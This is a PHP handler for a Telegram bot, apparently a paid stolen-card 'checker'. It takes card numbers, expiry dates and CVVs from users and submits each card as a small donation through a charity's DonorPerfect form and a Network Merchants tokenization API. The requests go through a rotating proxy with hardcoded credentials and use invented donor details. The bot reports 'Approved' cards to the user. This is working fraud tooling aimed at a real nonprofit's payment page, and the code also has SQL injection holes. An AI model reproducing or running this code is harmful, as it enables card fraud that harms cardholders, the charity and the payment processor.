<?php

require_once '/home/alvcarr230/www/project/data/data.php';
list($cmd) = explode(" ", $text);
if($cmd == "/ar" or $cmd == ".ar" or $cmd == "!ar" or $cmd == "?ar" or $cmd == "#ar" or $cmd == ":ar" or $cmd == ",ar"){ 
// A part for gatecmd clearance
    if($cmd == '/ar'){
        $gatecmd = "ar";
    }elseif($cmd == ".ar"){
        $gatecmd = "ar";
    }elseif($cmd == "!ar"){
        $gatecmd = "ar";
    }elseif($cmd == "?ar"){
        $gatecmd = "ar";
    }elseif($cmd == "#ar"){
        $gatecmd = "ar";
    }elseif($cmd == ":ar"){
        $gatecmd = "ar";
    }elseif($cmd == ",ar"){
        $gatecmd = "ar";
    }
    $listan = clean($text);
$listaq = clean($quetzal);
if(empty($listan)){
$lista = $listaq;
}elseif(empty($listaq)){
$lista = $listan;
}
/*$content = ['chat_id' => $chat_id, 'text' => "$lista", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();*/
error_reporting(0);
unlink(getcwd().'/cookie.txt');
    
//-------------[ MYSQL CALL PART] ----_-----//

    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$SQL);
    $raw = mysqli_fetch_assoc($cs);
    $planexpiry = $raw['planexpiry'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $gatec = $raw['gatecmd'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='ar'";
        $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $status = $raw['status'];
     mysqli_close(mysqlcon());

    
    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $plan = $raw['plan'];
     mysqli_close(mysqlcon());
    

$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $chats = $raw['chats'];
    $now = time();
    
    /* This part for condition of gateways and some others*/
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    
    
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "$gate_not_added", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{}

    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Aristimetic 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    } else {}

$matches = $lista;
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $lista, $matches);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$fecha = ''.$mes.''.$ano.'';
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
$lista = "$cc|$mes|$ano|$cvv";


        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Rayko 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Rayko 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        
     $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $antispam2 = $RAW['antispam2'];
     $time =   str_replace('s','',$antispam2);
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }


        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
$starttime = microtime(true);
$mytime = 'time1';
        $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[ 💳$lista ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];

//==================[BIN LOOK-UP]======================//
$url = 'https://projectslost.xyz/bin/?bin='.$bin.'';
$fim = json_decode(file_get_contents($url), true);
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim['bank']["name"];
$bankphone = $fim['bank']["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
//==================[BIN LOOK-UP-END]======================//

# ------------ Ramdom User ------------ #
$firstname = ucfirst(str_shuffle('anthonysudiaj'));
$lastname = ucfirst(str_shuffle('pitoshduajdb'));
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$email = 'anthoyn'.$firstname.'us82j37'.$phone.'@gmail.com';
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = $statee;
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = $statee;
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = $statee;
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = $statee;
$zip = "32003";
$city = "Orange Park";
}else{
$state = $statee;
$zip = "90201";
$city = "Bell";
};

/*=====  2REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.networkmerchants.com/token/api/create');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "wiedhtrt-rotate:qyhf7utdjb2u");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /token/api/create h2';
$headers[] = 'Host: secure.networkmerchants.com';
#$headers[] = 'content-length: 67';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://form-renderer-app.donorperfect.io';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://form-renderer-app.donorperfect.io/';
$headers[] = 'accept-language: es-US,es-419;q=0.9,es;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT');
$r2 = curl_exec($ch);
$id2 = trim(strip_tags(getdata($r2,'"token":"','"')));

/*=====  3REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.networkmerchants.com/token/api/save_multipart_token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "wiedhtrt-rotate:qyhf7utdjb2u");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /token/api/save_multipart_token h2';
$headers[] = 'Host: secure.networkmerchants.com';
#$headers[] = 'content-length: 67';
$headers[] = 'accept: */*';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'origin: https://secure.networkmerchants.com';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://secure.networkmerchants.com/token/inline.php?tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT&token='.$id2.'&elementId=ccnumber&title=Card Number&placeholder=&enableCardBrandPreviews=false';
$headers[] = 'accept-language: es-US,es-419;q=0.9,es;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT","tokenId":"'.$id2.'","data":[{"elementId":"ccnumber","value":"'.$cc.'"}]}');
$r3 = curl_exec($ch);
$value = trim(strip_tags(getdata($r3,'"ccnumber","value":"','"')));
 
$content2 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - ? - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m2  = EditMessageText($content2);
        $m2i = $m2['result']['message_id'];

/*=====  4REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.networkmerchants.com/token/api/save_multipart_token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "wiedhtrt-rotate:qyhf7utdjb2u");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /token/api/save_multipart_token h2';
$headers[] = 'Host: secure.networkmerchants.com';
#$headers[] = 'content-length: 67';
$headers[] = 'accept: */*';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'origin: https://secure.networkmerchants.com';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://secure.networkmerchants.com/token/inline.php?tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT&token='.$id2.'&elementId=ccnumber&title=Card Number&placeholder=&enableCardBrandPreviews=false';
$headers[] = 'accept-language: es-US,es-419;q=0.9,es;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT","tokenId":"'.$id2.'","data":[{"elementId":"ccexp","value":"'.$fecha.'"}]}');
$r4 = curl_exec($ch);
$expvalue = trim(strip_tags(getdata($r4,'"ccexp","value":"','"')));

/*=====  5REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.networkmerchants.com/token/api/save_multipart_token');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "wiedhtrt-rotate:qyhf7utdjb2u");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /token/api/save_multipart_token h2';
$headers[] = 'Host: secure.networkmerchants.com';
#$headers[] = 'content-length: 67';
$headers[] = 'accept: */*';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'origin: https://secure.networkmerchants.com';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://secure.networkmerchants.com/token/inline.php?tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT&token='.$id2.'&elementId=ccnumber&title=Card Number&placeholder=&enableCardBrandPreviews=false';
$headers[] = 'accept-language: es-US,es-419;q=0.9,es;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT","tokenId":"'.$id2.'","data":[{"elementId":"cvv","cvvDisplay":true,"value":"'.$cvv.'"}]}');
$r5 = curl_exec($ch);
$cvvvalue = trim(strip_tags(getdata($r5,'"value":"','"')));

$content3 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>
", 'message_id' => $m2i, 'parse_mode' => 'html'];
$m3 = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];

/*=====  6REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.networkmerchants.com/token/api/lookup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "wiedhtrt-rotate:qyhf7utdjb2u");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /token/api/lookup';
$headers[] = 'Host: secure.networkmerchants.com';
#$headers[] = 'content-length: 67';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://form-renderer-app.donorperfect.io';
$headers[] = 'sec-fetch-site: cross-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://form-renderer-app.donorperfect.io/';
$headers[] = 'accept-language: es-US,es-419;q=0.9,es;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"tokenId":"'.$id2.'","tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT"}');
$r6 = curl_exec($ch);
$ccres = trim(strip_tags(getdata($r6,'{"card":{"number":"','"')));
$binres = trim(strip_tags(getdata($r6,'"bin":"','"')));
$brandres = trim(strip_tags(getdata($r6,'"type":"','"')));

 $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - 🟢 ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

/*=====  7REQ  ======*/
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://form-renderer-api.donorperfect.io/api/FormSubmission');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "wiedhtrt-rotate:qyhf7utdjb2u");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /api/FormSubmission h2';
$headers[] = 'authority: form-renderer-api.donorperfect.io';
#$headers[] = 'content-length: 67';
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
$headers[] = 'content-type: application/json';
$headers[] = 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2MTE4MDkiLCJhcCI6IjgzMDMxNTc3NSIsImlkIjoiZDVjMzZjZmExZTk2NTFjZCIsInRyIjoiYmZhNTQ4NDdiMmFiNDhiYjNmY2E2MWZjMGQ1OTIxYTAiLCJ0aSI6MTY2NzY5MDk2NjkwMn19';
$headers[] = 'origin: https://form-renderer-app.donorperfect.io';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://form-renderer-app.donorperfect.io/';
$headers[] = 'tracestate: 2611809@nr=0-1-2611809-830315775-8449dfc9993b9401----1664314723490';
$headers[] = 'traceparent: 00-04df4827d1ff72a83a41035b38554ea0-8449dfc9993b9401-01';
$headers[] = 'accept-language: es-US,es-419;q=0.9,es;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"meta-data":{"formId":"75ea7311-6f4b-4b4a-9226-a117fd915c54","formVersion":1665520725361,"formName":"Website Donation","localDateTime":"2022-11-05T18:29:26.887","hiddenFields":{"GL_CODE":"","CAMPAIGN":"","SOLICIT_CODE":"","TY_LETTER_NO":"SA","SUB_SOLICIT_CODE":""}},"data":{"frequency":"M","contact-first-name":"aln","contact-last-name":"idm","contact-email":"jaribcantillo8@gmail.com","contact-phone":"3007396123","contact-address":"Street Jeff 269a","contact-address2":"","contact-city":"Miami","contact-state":"FL","contact-zip":"33122","No fields were found":false,"ANNUALREPORTLISTING":"aln idm","ANONGFT":false,"same-address":true,"billing-first-name":"aln","billing-last-name":"idm","billing-address":"Street Jeff 269a","billing-address2":"","billing-city":"Miami","billing-state":"FL","billing-zip":"33122","billing-phone":"3007396123","amount":"10","tribute_on":false,"tribute_type":"M","tributes_notify":[],"offset-fee-on":false,"offset-fee-amount":"0.00","dcc-amount":"0.00"},"payment-data":{"tokenType":"inline","token":"'.$id2.'","card":{"number":"'.$ccres.'","bin":"'.$binres.'","exp":"'.$fecha.'","type":"'.$brandres.'","hash":""},"check":{"name":null,"account":null,"aba":null,"hash":null},"wallet":{"cardDetails":null,"cardNetwork":null,"email":null,"billingInfo":{"address1":null,"address2":null,"firstName":null,"lastName":null,"postalCode":null,"city":null,"state":null,"country":null,"phone":null},"shippingInfo":{"address1":null,"address2":null,"firstName":null,"lastName":null,"postalCode":null,"city":null,"state":null,"country":null,"phone":null}}},"paypal-data":{"payPalPayment":false,"orderId":null,"correlationHandle":"aeb75401-2490-4cc5-8d24-62df3fe97c07","paypalEmail":null,"paymentType":"Credit"}}');
$r7 = curl_exec($ch);
$avs = trim(strip_tags(getdata($r7,'"AVSResponse":"','"')));
$cvv = trim(strip_tags(getdata($r7,'"CVVResponse":"','"')));
$message = trim(strip_tags(getdata($r7,'"ErrorMessage":"','"')));

$codeslives = array('Decline CVV2/CID Fail', 'Insufficient funds', 'AVS REJECTED');

if(in_array($message, $codeslives)) {
	$status = "Approved ✅️";
}else{
	$status = "Declined ❌️";
}

 $contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
↳ Gateway Aristimetic [🍃]
-----------------------------------------
⎆𝐂𝐂» <code>$lista</code>
⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>$status</code> ]
⎆𝐌𝐞𝐬𝐬𝐚𝐠𝐞» <code>$message</code>
⎆𝐀𝐕𝐒» $avs   ⎆𝐂𝐕𝐕» $cvv
-----------------------------------------
⎆𝐁𝐢𝐧» <code>$bin</code>
⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
------------------------------------------
⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>{$mytime($starttime)}s </i></code>
⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($contentf);
      
}

/// no tocar mas este gate, esta funcionando
?>